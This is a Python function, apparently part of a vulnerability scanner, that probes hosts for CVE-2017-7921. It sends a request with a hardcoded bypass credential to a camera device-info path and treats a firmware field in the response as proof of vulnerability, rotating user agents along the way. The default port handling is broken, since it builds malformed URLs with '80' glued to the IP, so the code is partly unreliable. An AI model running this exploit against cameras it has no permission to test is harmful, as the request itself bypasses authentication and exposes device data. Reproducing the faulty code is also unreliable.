import requests
from lib.headers.headers_handler import user_agents
from lib.color_handler import print_green, print_blue, print_red, print_yellow

def check_CVE_2017_7921(ip, ports=None, timeout=10):
    path = "/system/deviceInfo?auth=YWRtaW46MTEK"
    matcher = "<firmwareVersion>"
    protocols = ["http", "https"]
    if ports is None:
        ports = [80]
    else:
        ports = [f":{port}" for port in ports]
    for protocol in protocols:
        for port in ports:
            url = f"{protocol}://{ip}{port}{path}"
            headers = {
                'User-Agent': user_agents()
            }
            try:
                response = requests.get(url, headers=headers, timeout=timeout, verify=False)
                if matcher in response.text:
                    print_green(f"The target is vulnerable to CVE-2017-7921 : {url}")
                    return True
            except requests.RequestException:
                continue
    return False